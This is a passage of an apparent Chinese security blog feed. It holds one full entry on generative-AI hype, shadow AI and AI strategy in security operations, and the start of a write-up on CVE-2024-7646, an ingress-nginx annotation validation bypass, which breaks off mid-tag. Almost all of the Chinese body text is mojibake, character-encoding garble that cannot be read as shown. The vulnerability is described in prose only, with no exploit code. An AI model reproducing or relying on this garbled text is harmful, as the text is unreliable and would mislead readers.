    <url>/2024/10/18/%E2%80%9CAI%E7%96%B2%E5%8A%B3%E2%80%9D%E4%BA%86%EF%BC%9F%E8%AE%A9%E6%88%91%E4%BB%AC%E6%9D%A5%E7%9C%8B%E7%9C%8B%E7%9C%9F%E6%AD%A3%E7%9A%84AI-%E5%AE%89%E5%85%A8%E8%A6%81%E7%82%B9/</url>
    
    <content type="html"><![CDATA[<h2 id="0x00-å‰è¨€"><a href="#0x00-å‰è¨€" class="headerlink" title="0x00 å‰è¨€"></a>0x00 å‰è¨€</h2><p>è¶‹åŠ¿ç§‘æŠ€ç¾å›½ä¼ä¸šé¦–å¸­é£é™©å®˜ David Roth ä¸ç‰¹é‚€æ¼”è®²å˜‰å®¾ Forrester å‰¯æ€»è£å…¼é¦–å¸­åˆ†æå¸ˆ Jeff Pollard æœ€è¿‘å°±äººå·¥æ™ºèƒ½ç‚’ä½œä¸ç°å®ä»¥åŠå¦‚ä½•åœ¨å·¥ä½œåœºæ‰€ä¿æŠ¤äººå·¥æ™ºèƒ½è¿›è¡Œäº†è®¨è®ºã€‚</p><p>Jeff Pollard è¯´ï¼šâ€œæˆ‘ä¸æ•¢è¯´æˆ‘ä»¬å·²ç»åˆ°è¾¾äº†äººå·¥æ™ºèƒ½ç‚’ä½œçš„é¡¶ç‚¹ã€‚ä½†æˆ‘è§‰å¾—æˆ‘ä»¬å¯èƒ½å·²ç»æ¥è¿‘äº†ï¼Œå¦åˆ™æˆ‘ä»¬æ•´ä¸ªè¡Œä¸šå¯èƒ½ä¼šé¢ä¸´å›°å¢ƒï¼Œå› ä¸ºç°åœ¨æœ‰å¤ªå¤šä¸åˆ‡å®é™…çš„æ‰¿è¯ºå’ŒæœŸæœ›è¢«æå‡ºï¼Œè€Œè¿™äº›æ‰¿è¯ºå’ŒæœŸæœ›ç›®å‰å¹¶æ²¡æœ‰å¾—åˆ°å…‘ç°ã€‚â€</p><h2 id="0x01-è­¦æƒ•äººå·¥æ™ºèƒ½ç‚’ä½œ"><a href="#0x01-è­¦æƒ•äººå·¥æ™ºèƒ½ç‚’ä½œ" class="headerlink" title="0x01 è­¦æƒ•äººå·¥æ™ºèƒ½ç‚’ä½œ"></a>0x01 è­¦æƒ•äººå·¥æ™ºèƒ½ç‚’ä½œ</h2><p>Jeff Pollardï¼šâ€œä½ ç”ŸæˆæŠ¥å‘Šçš„é€Ÿåº¦è¶Šå¿«ï¼Œä½ å¤„ç†äº‹ä»¶çš„æ—¶é—´å°±è¶Šå¤šã€‚â€</p><p>å¯¹ç½‘ç»œå®‰å…¨é¢†åŸŸç”Ÿæˆå¼äººå·¥æ™ºèƒ½çš„ç‚’ä½œï¼Œå¹¶éä»…ä»…æ˜¯å› ä¸ºäººä»¬å¯¹æ–°å¥‡äº‹ç‰©çš„è¿·æ‹ã€‚</p><p>å®‰å…¨å›¢é˜Ÿè¿«åˆ‡éœ€è¦ç¼“è§£å‹åŠ›ï¼Œä»–ä»¬æ‰¿å—ç€å·¨å¤§çš„å‹åŠ›ï¼Œèµ„æºåŒ®ä¹ï¼Œé•¿æœŸé¢ä¸´æŠ€èƒ½çŸ­ç¼ºçš„é—®é¢˜ï¼ŒåŒæ—¶è¿˜è¦åº”å¯¹ä¸æ–­å¢åŠ å’Œå˜åŒ–çš„å¨èƒã€‚</p><p>åœ¨è®¨è®ºç”Ÿæˆå¼äººå·¥æ™ºèƒ½ï¼ˆgenAIï¼‰æŠ€æœ¯çš„å…´èµ·ï¼Œè®¸å¤šäººå¯¹å…¶æŠ±æœ‰å¹»æƒ³ï¼Œè®¤ä¸ºå®ƒå¯ä»¥è‡ªåŠ¨åŒ–å¹¶å®Œå…¨æ¥ç®¡å®‰å…¨è¿è¥ä¸­å¿ƒï¼ˆSOCsï¼‰çš„å·¥ä½œï¼Œç”šè‡³åƒã€Šç»ˆç»“è€…ã€‹é‡Œçš„è§’è‰²é‚£æ ·ï¼Œæœ‰ä¸€ç§å¼ºå¤§çš„ã€å…·å¤‡è‡ªä¸»å†³ç­–èƒ½åŠ›çš„æ¶æ„è½¯ä»¶ç‹©çŒä»£ç†ã€‚</p><blockquote><p>æ¶æ„è½¯ä»¶ç‹©çŒä»£ç†ï¼ˆmalware-hunting agentsï¼‰æŒ‡çš„æ˜¯ä¸€ç§ä¸“é—¨ç”¨äºæ£€æµ‹ã€è¯†åˆ«ã€è¿½è¸ªå’Œæ¶ˆé™¤æ¶æ„è½¯ä»¶çš„è‡ªåŠ¨åŒ–å·¥å…·æˆ–ç³»ç»Ÿã€‚åœ¨ç½‘ç»œå®‰å…¨ä¸­ï¼Œè¿™äº›â€œä»£ç†â€å¯ä»¥æ˜¯åŸºäºäººå·¥æ™ºèƒ½æˆ–è‡ªåŠ¨åŒ–è§„åˆ™çš„ç¨‹åºæˆ–æœåŠ¡ï¼Œè´Ÿè´£åœ¨ç³»ç»Ÿæˆ–ç½‘ç»œä¸­ä¸»åŠ¨å¯»æ‰¾å’Œåº”å¯¹æ¶æ„è½¯ä»¶å¨èƒã€‚</p></blockquote><p>ç„¶è€Œï¼Œä»Šå¤©çš„ç”Ÿæˆå¼äººå·¥æ™ºèƒ½ç³»ç»Ÿè¿˜ä¸è¶³ä»¥åœ¨æ²¡æœ‰äººç±»å¹²é¢„å’Œç›‘ç£çš„æƒ…å†µä¸‹æœ‰æ•ˆè¿è¡Œã€‚</p><p>å®ƒè¿œéç¥å¥‡åœ°è§£å†³æŠ€èƒ½çŸ­ç¼ºé—®é¢˜ï¼Œåè€Œå¯èƒ½åœ¨çŸ­æœŸå†…é€šè¿‡å¼•å…¥æ–°çš„åŸ¹è®­éœ€æ±‚è€ŒåŠ å‰§è¿™ä¸€é—®é¢˜ã€‚</p><p>æ–‡åŒ–å› ç´ ä¹Ÿä¸å®¹å¿½è§†ã€‚è™½ç„¶ç»éªŒä¸°å¯Œçš„ä»ä¸šè€…å¯èƒ½å¾ˆå¿«å°±èƒ½å­¦ä¼šæ–°çš„ AI å·¥å…·ï¼Œä½†ä»–ä»¬ä»ç„¶éœ€è¦å‡ å‘¨æˆ–å‡ ä¸ªæœˆçš„æ—¶é—´æ¥æ”¹å˜ä»–ä»¬çš„ä¹ æƒ¯ï¼Œå¹¶å°†è¿™äº›å·¥å…·æ•´åˆåˆ°ä»–ä»¬çš„å·¥ä½œæµç¨‹ä¸­ã€‚</p><p>å°½ç®¡å¦‚æ­¤ï¼Œå½“å‰çš„ç”Ÿæˆå¼äººå·¥æ™ºèƒ½ç³»ç»Ÿåœ¨å®‰å…¨é¢†åŸŸä»ç„¶æœ‰å¾ˆå¤šæœ‰å¸å¼•åŠ›çš„åº”ç”¨æ¡ˆä¾‹ã€‚</p><p>é€šè¿‡å¢å¼ºç°æœ‰èƒ½åŠ›ï¼Œäººå·¥æ™ºèƒ½å¯ä»¥å¸®åŠ©å›¢é˜Ÿç”¨æ›´å°‘çš„è‹¦å·®äº‹åšæ›´å¤šçš„äº‹æƒ…ï¼Œå¹¶è·å¾—æ›´å¥½çš„ç»“æœï¼Œç‰¹åˆ«æ˜¯åœ¨åº”ç”¨å¼€å‘ã€æ£€æµ‹å’Œå“åº”ç­‰é¢†åŸŸã€‚</p><h2 id="0x02-æŠŠæ¡å¿«é€Ÿè§æ•ˆçš„æœºä¼š"><a href="#0x02-æŠŠæ¡å¿«é€Ÿè§æ•ˆçš„æœºä¼š" class="headerlink" title="0x02 æŠŠæ¡å¿«é€Ÿè§æ•ˆçš„æœºä¼š"></a>0x02 æŠŠæ¡å¿«é€Ÿè§æ•ˆçš„æœºä¼š</h2><p>David Rothï¼šâ€œè™½ç„¶å®ƒå¹¶ä¸åƒç”µå½±ã€Šå°‘æ•°æ´¾æŠ¥å‘Šã€‹ä¸­é¢„é˜²çŠ¯ç½ªéƒ¨é—¨é‚£æ ·ç¥å¥‡ï¼Œä½†è‡³å°‘ä½ èƒ½å¤Ÿé€šè¿‡åˆ†ææµ·é‡æ•°æ®ï¼Œæ´å¯Ÿåˆ°æ½œåœ¨æ”»å‡»è·¯å¾„çš„å¯èƒ½æ€§å’Œç‰¹å¾ã€‚â€</p><p>åœ¨ç”Ÿæˆå¼äººå·¥æ™ºèƒ½çš„å¸®åŠ©ä¸‹ï¼Œå®‰å…¨å›¢é˜Ÿèƒ½è¿…é€Ÿè·å¾—æˆæ•ˆçš„ä¸€ä¸ªé¢†åŸŸæ˜¯æ–‡æ¡£ç”Ÿæˆã€‚</p><p>è¡ŒåŠ¨æ€»ç»“ã€äº‹ä»¶è®°å½•ç­‰æŠ¥å‘Šçš„ç¼–å†™æ—¢æ¯ç‡¥åˆè€—æ—¶ï¼Œä½†å´æ˜¯å¿…ä¸å¯å°‘çš„å·¥ä½œã€‚</p><p>ç”Ÿæˆå¼äººå·¥æ™ºèƒ½èƒ½å¤Ÿå³æ—¶ç”Ÿæˆè¿™äº›æ–‡æ¡£ï¼Œä»è€Œè®©å®‰å…¨ä¸“å®¶æœ‰æ›´å¤šæ—¶é—´å’Œç²¾åŠ›å»å¤„ç†æ›´å¤šçš„å®‰å…¨äº‹ä»¶ã€‚</p><p>éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œå®‰å…¨ä¸“å®¶åœ¨å±¥è¡ŒèŒè´£æ—¶éœ€è¦å…·å¤‡è‰¯å¥½çš„æ²Ÿé€šæŠ€å·§ã€‚</p><p>è™½ç„¶äººå·¥æ™ºèƒ½ç”Ÿæˆçš„æŠ¥å‘Šå¯ä»¥èŠ‚çœæ—¶é—´ï¼Œä½†è¿™ä¸åº”è¯¥ä»¥ç‰ºç‰²ä¸ªäººèŒä¸šå‘å±•ä¸ºä»£ä»·ã€‚</p><p>æ­¤å¤–ï¼Œç”Ÿæˆå¼äººå·¥æ™ºèƒ½è¿˜èƒ½æ¨èä¸‹ä¸€æ­¥çš„æœ€ä½³è¡ŒåŠ¨ï¼Œå¹¶èƒ½æ¯”äººç±»æ›´å¿«åœ°ä»ç°æœ‰çŸ¥è¯†åº“ä¸­æ£€ç´¢å‡ºå¯ç”¨ä¿¡æ¯ã€‚</p><p>åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œå…³é”®æ˜¯è¦ç¡®ä¿äººå·¥æ™ºèƒ½çš„è¾“å‡ºä¸ç»„ç»‡çš„éœ€æ±‚å’Œæ–¹æ³•è®ºä¿æŒä¸€è‡´ã€‚</p><p>ä¾‹å¦‚ï¼Œåœ¨ä¸€ä¸ªé¢„å®šçš„æµç¨‹ä¸­æœ‰ä¸ƒä¸ªæ­¥éª¤ï¼Œè€Œ AI åŠ©æ‰‹åªå»ºè®®å®Œæˆå…¶ä¸­çš„å››ä¸ªæ­¥éª¤æ—¶ï¼Œé‚£ä¹ˆäººç±»æ“ä½œå‘˜å°±éœ€è¦ç¡®ä¿æ‰€æœ‰ä¸ƒä¸ªæ­¥éª¤éƒ½è¢«éµå¾ª â€”â€” è¿™æ ·æ‰èƒ½è¾¾åˆ°é¢„æœŸçš„æ•ˆæœï¼Œå¹¶ç¡®ä¿æ‰€é‡‡å–çš„è¡ŒåŠ¨æ—¢ç¬¦åˆå…¬å¸æ”¿ç­–ä¹Ÿç¬¦åˆå¤–éƒ¨æ³•è§„ã€‚</p><p>æ— æ„é—´é‡‡å–çš„æ·å¾„å¯èƒ½ä¼šå¸¦æ¥ä¸¥é‡åæœã€‚</p><blockquote><p>è™½ç„¶æ·å¾„çœ‹ä¼¼èŠ‚çœæ—¶é—´æˆ–ç®€åŒ–æµç¨‹ï¼Œä½†å¦‚æœè¿™äº›æ·å¾„ä¸æ˜¯æœ‰æ„è®¾è®¡çš„ï¼Œå¯èƒ½ä¼šå¯¼è‡´å…³é”®æ­¥éª¤è¢«å¿½ç•¥ï¼Œä»è€Œå¼•å‘ä¸¥é‡çš„é—®é¢˜ã€‚ä¾‹å¦‚ï¼Œåœ¨å®‰å…¨æ“ä½œæˆ–å¤æ‚çš„ä¸šåŠ¡æµç¨‹ä¸­ï¼Œè·³è¿‡å¿…è¦æ­¥éª¤å¯èƒ½å¯¼è‡´æ¼æ´ã€é”™è¯¯æˆ–ç³»ç»Ÿå¤±è´¥ã€‚</p></blockquote><h2 id="0x03-åˆ©ç”¨-AI-ä¸»åŠ¨å‡ºå‡»"><a href="#0x03-åˆ©ç”¨-AI-ä¸»åŠ¨å‡ºå‡»" class="headerlink" title="0x03 åˆ©ç”¨ AI ä¸»åŠ¨å‡ºå‡»"></a>0x03 åˆ©ç”¨ AI ä¸»åŠ¨å‡ºå‡»</h2><p>David Rothï¼šâ€œå¦‚æœä½ çš„ä¼ä¸šä½¿ç”¨äº†ä¼ä¸šçº§è½¯ä»¶ï¼Œé‚£ä¹ˆå®ƒå¾ˆå¯èƒ½å·²ç»é›†æˆäº†äººå·¥æ™ºèƒ½æŠ€æœ¯ã€‚æ— è®ºæ˜¯ SAP çš„ Jouleã€é›†æˆäº† Einstein GPT çš„ Salesforceã€è¿˜æ˜¯ä¸ Copilot åˆä½œçš„ Microsoft ç­‰å…¶ä»–è®¸å¤šç±»ä¼¼çš„äº§å“ã€‚è¿™åˆæ˜¯ä¸€ä¸ªä½ éœ€è¦å…³æ³¨çš„é—®é¢˜ï¼Œå› ä¸ºè¿™äº›å˜åŒ–ä¼šæ”¹å˜ç”¨æˆ·ä¸å…¬å¸æ•°æ®äº’åŠ¨çš„æ–¹å¼ã€‚â€</p><p>ç”Ÿæˆæ€§äººå·¥æ™ºèƒ½ï¼ˆGenAIï¼‰æœ‰æœ›å°†â€œå¤§æ•°æ®éš¾é¢˜â€è½¬åŒ–ä¸ºå¤§æ•°æ®æœºé‡ï¼Œé€šè¿‡è¯†åˆ«æ”»å‡»é¢çš„å˜åŠ¨å’Œæ¨¡æ‹Ÿæ”»å‡»è·¯å¾„ï¼Œè®©å®‰å…¨å›¢é˜Ÿæ¯”ç°åœ¨æ›´åŠ ä¸»åŠ¨ã€‚</p><p>è™½ç„¶å®ƒå¯èƒ½æ— æ³•ç²¾ç¡®é¢„æµ‹æœªæ¥ï¼Œä½†å®ƒå¯ä»¥å¸®åŠ©å®‰å…¨å›¢é˜Ÿæå‰é˜²èŒƒé‚£äº›å¯èƒ½è¢«å¿½è§†çš„å¨èƒã€‚</p><p>è¿™ä¸€ç­–ç•¥åœ¨å®é™…åº”ç”¨ä¸­çš„æœ‰æ•ˆæ€§ï¼Œå–å†³äºç»„ç»‡å¯¹å…¶ç³»ç»Ÿã€é…ç½®å’Œå½“å‰çŠ¶æ€çš„äº†è§£ç¨‹åº¦ã€‚</p><p>å¦‚æœå­˜åœ¨ç›²ç‚¹ï¼ŒAI ä¹Ÿä¼šæœ‰ç›²ç‚¹ã€‚</p><p>é—æ†¾çš„æ˜¯ï¼Œè¿™äº›ç›²ç‚¹åœ¨ä»Šå¤©å¾ˆå¸¸è§ï¼Œå³ä½¿æ˜¯å¤§å‹ä¼ä¸šï¼Œæ•°æ®å’Œæ–‡æ¡£ä¹Ÿå¯èƒ½åˆ†æ•£è®°å½•åœ¨ä¸åŒè®¡ç®—æœºçš„å¤šä¸ªç”µå­è¡¨æ ¼ä¸­ã€‚</p><p>è¿™å‡¸æ˜¾äº†è‰¯å¥½çš„ã€AI å‹å¥½çš„æ•°æ®ç®¡ç†ä¹ æƒ¯å’Œæ ‡å‡†åŒ–çš„æ•°æ®ç®¡ç†æ–¹æ³•çš„é‡è¦æ€§ã€‚åŸå§‹æ•°æ®çš„è´¨é‡è¶Šé«˜ï¼ŒAI èƒ½åšçš„äº‹æƒ…å°±è¶Šå¤šã€‚</p><h2 id="0x04-æ³¨æ„å½±å­-AI"><a href="#0x04-æ³¨æ„å½±å­-AI" class="headerlink" title="0x04 æ³¨æ„å½±å­ AI"></a>0x04 æ³¨æ„å½±å­ AI</h2><p>David Rothï¼šâ€œè¿™è®©æˆ‘å›æƒ³èµ·äº†æ—©æœŸäº‘è®¡ç®—çš„è¶…é€Ÿå¢é•¿æ—¶æœŸâ€¦â€¦ å½“ä½ è·Ÿä¸ä¸Šä¸šåŠ¡å‘å±•çš„é€Ÿåº¦æ—¶ï¼Œé€šè¿‡æ²»ç†å’Œå®‰å…¨æ§åˆ¶æ¥å®æ–½å°±å˜å¾—æ›´åŠ å›°éš¾ã€‚â€</p><p>ä¼ä¸šå¯¹ AI å¯èƒ½æ³„éœ²æ•æ„Ÿçš„å…¬å¸æˆ–å®¢æˆ·ä¿¡æ¯æ„Ÿåˆ°æ‹…å¿§æ˜¯æœ‰é“ç†çš„ã€‚</p><p>è¿™ç§æƒ…å†µå¯èƒ½é€šè¿‡å‘˜å·¥ä½¿ç”¨æœªç»æˆæƒçš„å·¥å…·ï¼Œæˆ–è€…é€šè¿‡é‚£äº›è¶Šæ¥è¶Šå¤šé›†æˆäº† AI åŠŸèƒ½çš„è·æ‰¹å‡†çš„ä¼ä¸šè½¯ä»¶å‘ç”Ÿã€‚</p><p>åœ¨è¿‡å»ï¼Œæ¶æ„è¡Œä¸ºè€…éœ€è¦æ‡‚å¾—å¦‚ä½•ä¾µå…¥ ERP ç³»ç»Ÿæ‰èƒ½è·å–é‡Œé¢çš„æœªæˆæƒæ•°æ®ï¼›è€Œæœ‰äº† AIï¼Œä¸€ä¸ªæ°å½“çš„æç¤ºå¯èƒ½è¿‡äºè½»æ˜“åœ°æš´éœ²äº†åŒæ ·çš„ä¿¡æ¯ã€‚</p><p>ä¼ä¸šéœ€è¦é˜²èŒƒå‘˜å·¥ç§è‡ªä½¿ç”¨æœªç»æ‰¹å‡†çš„ AI å·¥å…·ï¼ˆå³â€œå½±å­ AIâ€ï¼‰ä»¥åŠä¸å½“ä½¿ç”¨å·²è·æ‰¹å‡†çš„ AI å·¥å…·ï¼Œä»¥ç¡®ä¿å…¶å®‰å…¨å’Œåˆè§„ã€‚</p><blockquote><p>å½±å­ AIï¼ˆShadow AIï¼‰æŒ‡çš„æ˜¯åœ¨ä¼ä¸šæˆ–ç»„ç»‡å†…éƒ¨ï¼Œæœªç»æ­£å¼æ‰¹å‡†æˆ– IT éƒ¨é—¨ç›‘ç®¡ï¼Œç”±å‘˜å·¥æˆ–å›¢é˜Ÿç§è‡ªä½¿ç”¨çš„äººå·¥æ™ºèƒ½å·¥å…·æˆ–æœåŠ¡ã€‚è¿™ç±» AI å·¥å…·æ²¡æœ‰ç»è¿‡ç»„ç»‡çš„å®‰å…¨ã€åˆè§„æˆ–æ²»ç†æµç¨‹å®¡æŸ¥ï¼Œç±»ä¼¼äºâ€œShadow ITâ€çš„æ¦‚å¿µã€‚</p></blockquote><p>åœ¨ä½¿ç”¨å¤§å‹è¯­è¨€æ¨¡å‹ï¼ˆLLMï¼‰ä¸ºè‡ªå·±æ„å»ºåº”ç”¨ç¨‹åºæ—¶ï¼Œä¹Ÿéœ€è¦æ ¼å¤–å°å¿ƒã€‚ä¸ä»…éœ€è¦ä¿æŠ¤æ­£åœ¨æ„å»ºçš„åº”ç”¨ç¨‹åºï¼Œåº•å±‚æ•°æ®ã€LLM æœ¬èº«ä»¥åŠæç¤ºç³»ç»Ÿéƒ½éœ€è¦å¾—åˆ°ä¿æŠ¤ã€‚</p><p>è¿™äº›é£é™©åŸºæœ¬ä¸Šå¯ä»¥å½’ç»“ä¸ºä¸‰ç±»æ–°é—®é¢˜ï¼šAI æœ¬èº«çš„é—®é¢˜ã€ä¼ä¸šåº”ç”¨é—®é¢˜ä»¥åŠäº§å“å®‰å…¨æˆ–åˆ›æ–°é—®é¢˜ã€‚</p><p>æ¯ç§é—®é¢˜éƒ½éœ€è¦ä¸“é—¨çš„ä¿æŠ¤æªæ–½ï¼Œå¹¶ä¸”ä¼šå½±å“é¦–å¸­ä¿¡æ¯å®‰å…¨å®˜ï¼ˆCISOï¼‰çš„è´£ä»» â€”â€” å°½ç®¡ CISO å¹¶ä¸ç›´æ¥è´Ÿè´£ç›¸å…³é¡¹ç›®ã€‚</p><h2 id="0x05-åˆ¶å®šä½ çš„-AI-æˆ˜ç•¥"><a href="#0x05-åˆ¶å®šä½ çš„-AI-æˆ˜ç•¥" class="headerlink" title="0x05 åˆ¶å®šä½ çš„ AI æˆ˜ç•¥"></a>0x05 åˆ¶å®šä½ çš„ AI æˆ˜ç•¥</h2><p>å½±å­ IT åº”ç”¨çš„çƒ­æ½®ä¸äº‘è®¡ç®—çš„èµ·æ­¥é˜¶æ®µå’Œå½“å‰ AI çš„å‘å±•çŠ¶å†µä¹‹é—´æœ‰ç€ç›¸ä¼¼ä¹‹å¤„ã€‚</p><p>å®‰å…¨é¢†åŸŸçš„é¢†å¯¼è€…å°†æœªç»æ‰¹å‡†çš„åº”ç”¨ç§°ä¸ºâ€œå½±å­ ITâ€ï¼Œè€Œå•†ä¸šé¢†è¢–å’ŒæŠ•èµ„è€…åˆ™å°†å…¶è§†ä¸ºâ€œäº§å“é©±åŠ¨å¢é•¿â€ã€‚å®‰å…¨å›¢é˜Ÿå¾ˆå¿«æ„è¯†åˆ°ï¼Œä»–ä»¬æ— æ³•ç¦æ­¢è¿™äº›åˆ›æ–°ï¼šä»»ä½•è¯•å›¾å‹åˆ¶çš„å°è¯•éƒ½åªä¼šå°†ä½¿ç”¨æ¨å‘åœ°ä¸‹ï¼Œé‚£é‡Œæ ¹æœ¬æ— æ³•è¿›è¡Œç®¡ç†ã€‚</p><p>å®‰å…¨å›¢é˜Ÿéœ€è¦æ¥å—å¹¶é€‚åº” AI çš„ç°å®ã€‚å³ä½¿ AI ç›®å‰è¿˜æ²¡æœ‰å®Œå…¨å®ç°å…¶æœ€çƒ­å¿ƒæ”¯æŒè€…çš„æ‰€æœ‰æœŸæœ›å’Œæ¢¦æƒ³ï¼Œå³ä½¿å®ƒé‡åˆ°äº†ä¸€äº›æŒ«æŠ˜ï¼Œå› ä¸ºåœ¨æ¥ä¸‹æ¥çš„ä¸¤åˆ°ä¸‰å¹´å†…ï¼ŒAI å°†æ¯”ç°åœ¨æ›´åŠ æˆç†Ÿå’Œå¼ºå¤§ã€‚ç»„ç»‡ä¸èƒ½ç­‰åˆ°é‡‡ç”¨ AI ä¹‹åå†å»è€ƒè™‘å®‰å…¨é—®é¢˜ã€‚</p><p>è¿™æ„å‘³ç€ç°åœ¨æ˜¯å‡†å¤‡çš„æœ€ä½³æ—¶æœºï¼Œå¼€å‘ä»¥å®‰å…¨ä¸ºå¯¼å‘çš„ AI æˆ˜ç•¥ï¼Œäº†è§£è¿™é¡¹æŠ€æœ¯ï¼Œå¹¶ä¸º AI çœŸæ­£èµ·é£æ—¶åšå¥½å‡†å¤‡ã€‚è®¸å¤šè§‚å¯Ÿè€…è®¤ä¸ºï¼Œå°½ç®¡å®‰å…¨å›¢é˜Ÿæœ‰è¶³å¤Ÿçš„æ—¶é—´å‡†å¤‡ï¼Œä½†ä»–ä»¬åœ¨äº‘è®¡ç®—ä¸Šè¿˜æ˜¯æªæ‰‹ä¸åŠã€‚é‰´äº AI çš„æ½œåŠ›å’Œå¤æ‚æ€§ï¼Œä»–ä»¬ä¸èƒ½å†çŠ¯åŒæ ·çš„é”™è¯¯ã€‚</p><p>0x06 æ€»ç»“ï¼šæŒä¿ç•™æ€åº¦ï¼Œä½†è¦è®¤çœŸå¯¹å¾…<br>GenAI å¯èƒ½è¿˜æ²¡æœ‰è¾¾åˆ°å…¶å˜é©æ½œåŠ›çš„å®£ä¼ ï¼Œä½†å®ƒåœ¨ç½‘ç»œå®‰å…¨æ–¹é¢ä»ç„¶å…·æœ‰æœ‰æ„ä¹‰çš„åº”ç”¨ã€‚</p><p>å®ƒä¸ä¼šåœ¨çŸ­æœŸå†…è§£å†³æŠ€èƒ½çŸ­ç¼ºçš„é—®é¢˜ï¼Œä½†å¯ä»¥å‡è½»å®‰å…¨å›¢é˜Ÿçš„ä¸€äº›è´Ÿæ‹…ï¼Œè€Œä¸”ç»„ç»‡ç®¡ç†å’Œç»´æŠ¤ IT æ•°æ®çš„èƒ½åŠ›è¶Šå¥½ï¼Œéšç€æ—¶é—´çš„æ¨ç§»ï¼Œäººå·¥æ™ºèƒ½å°±è¶Šèƒ½å¤Ÿæ£€æµ‹ç”šè‡³é¢„é˜²ã€‚</p><p>é€šè¿‡æ±²å–è¿‘æœŸå½±å­ IT å’Œäº‘é‡‡ç”¨çš„ç»éªŒæ•™è®­ï¼Œå®‰å…¨å›¢é˜Ÿå¯ä»¥ä¸ºäººå·¥æ™ºèƒ½çœŸæ­£å¼€å§‹å®ç°å…¶æ›´è¿œå¤§æ¢¦æƒ³çš„é‚£ä¸€å¤©åšå¥½æœ‰æ•ˆå‡†å¤‡ï¼Œå¹¶ç¡®ä¿ä¼ä¸šå®‰å…¨ã€‚</p>]]></content>
    
    
    
    <tags>
      
      <tag>AI å®‰å…¨</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CVE-2024-7646ï¼šIngress-nginx æ³¨é‡ŠéªŒè¯ç»•è¿‡ã€é«˜å±ã€‘</title>
    <link href="/2024/08/19/CVE-2024-7646%EF%BC%9AIngress-nginx%E6%B3%A8%E9%87%8A%E9%AA%8C%E8%AF%81%E7%BB%95%E8%BF%87%E3%80%90%E9%AB%98%E5%8D%B1%E3%80%91/"/>
    <url>/2024/08/19/CVE-2024-7646%EF%BC%9AIngress-nginx%E6%B3%A8%E9%87%8A%E9%AA%8C%E8%AF%81%E7%BB%95%E8%BF%87%E3%80%90%E9%AB%98%E5%8D%B1%E3%80%91/</url>
    
    <content type="html"><![CDATA[<h2 id="0x00-å‰è¨€"><a href="#0x00-å‰è¨€" class="headerlink" title="0x00 å‰è¨€"></a>0x00 å‰è¨€</h2><p>è¯¥æ¼æ´è™½ç„¶éå¸¸çƒ­ä¹ï¼Œä½†æœ‰éå¸¸è¯¦ç»†çš„åˆ†ææ–‡ç« ï¼Œç”±äºè®¸å¤šä¼ä¸šå¹¶æœªéµå¾ªæœ€å°æƒé™åŸåˆ™ï¼Œä¸¥æ ¼æ‰§è¡ŒåŸºäºè§’è‰²çš„è®¿é—®æ§åˆ¶ï¼ˆRBACï¼‰ï¼Œå› æ­¤è¯¥æ¼æ´éœ€è¦å®‰å…¨ä¸“å®¶å’Œ DevOps å›¢é˜Ÿç«‹å³å…³æ³¨èµ·æ¥ã€‚</p><p>CVE-2024-7646 å½±å“ ingress-nginx æ§åˆ¶å™¨ï¼Œå…è®¸æ”»å‡»è€…ç»•è¿‡æ³¨é‡ŠéªŒè¯ï¼Œæ‰§è¡Œæ¶æ„å‘½ä»¤å¹¶æœªç»æˆæƒè®¿é—®æ•æ„Ÿçš„é›†ç¾¤èµ„æºã€‚å› æ­¤ï¼Œè¯¥æ¼æ´çš„ CVSS v3.1 åŸºæœ¬åˆ†æ•°ä¸º 8.8ï¼Œå¨èƒç­‰çº§ä¸ºé«˜å±ã€‚é‚£ä¹ˆé«˜çš„åˆ†æ•°åæ˜ äº†è¯¥æ¼æ´ä¼šäº§ç”Ÿé‡å¤§å½±å“çš„å¯èƒ½æ€§ï¼ŒåŒ…æ‹¬å—å½±å“ç³»ç»Ÿçš„æœºå¯†æ€§ã€å®Œæ•´æ€§å’Œå¯ç”¨æ€§å®Œå…¨å—æŸã€‚</p><h2 id="0x01-ç®€ä»‹"><a href="#0x01-ç®€ä»‹" class="headerlink" title="0x01 ç®€ä»‹"></a>0x01 ç®€ä»‹</h2><p><a href="https://www.armosec.io/glossary/kubernetes-nginx/#:~:text=and%20egress%20management.-,NGINX%20Ingress%20Controller,-The%20NGINX%20Ingress" title="Ingress-nginx">Ingress-nginx</a> æ˜¯ä¸€ä¸ªæµè¡Œçš„å¯ç”¨äºç®¡ç†é›†ç¾¤å†…æœåŠ¡çš„å¤–éƒ¨è®¿é—®çš„ Kubernetes Ingress æ§åˆ¶å™¨ã€‚å®ƒå……å½“åå‘ä»£ç†å’Œè´Ÿè½½å‡è¡¡å™¨ï¼Œå¹¶æ ¹æ®å®šä¹‰çš„è§„åˆ™å°†ä¼ å…¥çš„ HTTP å’Œ HTTPS æµé‡è·¯ç”±åˆ°é€‚å½“çš„æœåŠ¡ã€‚</p><p>è¿™ä¸ªå®‰å…¨æ¼æ´æ˜¯ç”± ingress-nginx åœ¨éªŒè¯ Ingress èµ„æºä¸Šçš„æ³¨è§£æ—¶çš„ä¸€ä¸ªé”™è¯¯å¼•èµ·çš„ã€‚åœ¨ Kubernetes ç³»ç»Ÿä¸­ï¼Œ<code>annotations</code>ç”¨äºé™„åŠ ä»»æ„çš„ã€ä¸ç”¨äºè¯†åˆ«çš„å…ƒæ•°æ®ä¿¡æ¯åˆ°èµ„æºä¸Šã€‚å¯¹äº ingress-nginxï¼Œ<code>annotations</code>è¢«ç”¨æ¥è®¾ç½®å…¥å£æ§åˆ¶å™¨çš„ä¸åŒè¡Œä¸ºã€‚</p><p>è¿™ä¸ªæ¼æ´ä½¿å¾—æ”»å‡»è€…èƒ½å¤Ÿå°†æ¶æ„å†…å®¹æ³¨å…¥åˆ°ç‰¹å®šçš„<code>annotations</code>ä¸­ï¼Œä»è€Œç»•è¿‡åŸæœ¬çš„éªŒè¯æœºåˆ¶ã€‚è¿™å¯èƒ½ä¼šå¼•èµ·ä»»æ„å‘½ä»¤çš„æ³¨å…¥ï¼Œä»¥åŠå¯èƒ½è·å–åˆ° ingress-nginx æ§åˆ¶å™¨çš„å‡­è¯ï¼ŒæŒ‰ç…§é»˜è®¤é…ç½®ï¼Œè¯¥æ§åˆ¶å™¨æœ‰æƒè®¿é—®é›†ç¾¤å†…çš„æ‰€æœ‰ secretã€‚</p><p><img src="/image/image_ZfrcaUE8L_.png" alt="å›¾ 1ï¼šæ¼æ´æè¿°ï¼ˆæ¥è‡ªï¼šNVDï¼‰" title="å›¾ 